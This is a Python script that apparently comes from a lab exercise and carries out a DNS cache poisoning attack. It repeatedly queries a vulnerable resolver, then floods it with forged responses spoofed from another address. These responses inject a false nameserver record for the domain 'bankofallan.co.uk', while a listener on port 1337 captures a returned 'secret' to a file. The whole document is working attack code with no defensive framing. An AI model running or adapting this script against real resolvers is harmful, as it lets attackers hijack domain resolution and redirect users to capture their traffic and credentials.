import threading
from scapy.all import *
from dnslib import *

DNS_SPOOF_IP = "10.0.0.1"
VULN_DNS_IP = "192.168.56.101"
BAD_DNS_IP = "192.168.56.1"

FOUND           = False
RANGE           = 200
TTL             = 3600
DNS_HOS_PORT    = 55553
DNS_DEF_PORT    = 53

DEF_ADDR        = "0.0.0.0"
SUFFIX          = "xyz"

def poisoner_aux():
    sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((DEF_ADDR, DNS_HOS_PORT))

    query = DNSRecord(q=DNSQuestion("badguy.ru",QTYPE.A))

    sock.sendto(bytes(query.pack()),("192.168.56.101", DNS_DEF_PORT))
    data, addr = sock.recvfrom(1024)
    
    sock.close()

    return DNSRecord.parse(data).header.id, addr[1]

def create_question(domain):
    fake_domain = SUFFIX + "." + domain 
    
    ip  = IP(dst=VULN_DNS_IP)
    udp = UDP(dport=DNS_DEF_PORT)
    dns = DNS(rd=1, qd=DNSQR(qname=fake_domain))
        
    return bytes(ip / udp / dns)

def create_answers(quid, port, domain):
    fake_domain = SUFFIX + "." + domain 
    packets = []

    start = quid + 1
    end = start + RANGE
    for i in range(start, end):

        ip  = IP(src=DNS_SPOOF_IP, dst=VULN_DNS_IP) 
        udp = UDP(sport=DNS_DEF_PORT, dport=port)
        dns = DNS(id=i, qr=1L,
                qd= DNSQR(qname=fake_domain, qtype='A', qclass='IN'),
                ns= DNSRR(rrname=domain, type='NS', rclass='IN', rdata=fake_domain, ttl=3600),
                ar= DNSRR(rrname=fake_domain, type='A', rclass='IN', rdata="1.2.3.4", ttl=3600)
        )

        res = (ip / udp / dns)
        packets.append(bytes(res))
    
    return packets

def listener(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((DEF_ADDR, port))
    
    data, addr = sock.recvfrom(4096)

    global FOUND
    FOUND = True

    sock.close()

    secret = str(data)
    
    print "secret found!"
    print secret

    with open("secret.txt", 'w') as f:
        f.write("secret:\n%s" % secret)


def poisoner(domain):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

    while not FOUND:
      
        quid, port = poisoner_aux()
        
        question = create_question(domain)
        answers = create_answers(quid, port, domain)

        sock.sendto(question, (VULN_DNS_IP, 0))
        for a in answers:
            sock.sendto(a, (VULN_DNS_IP, 0))

    sock.close()


if __name__ == '__main__':

    listener_t = threading.Thread(target=listener, args=(1337,))
    listener_t.start()
    
    poisoner("bankofallan.co.uk")

    
    

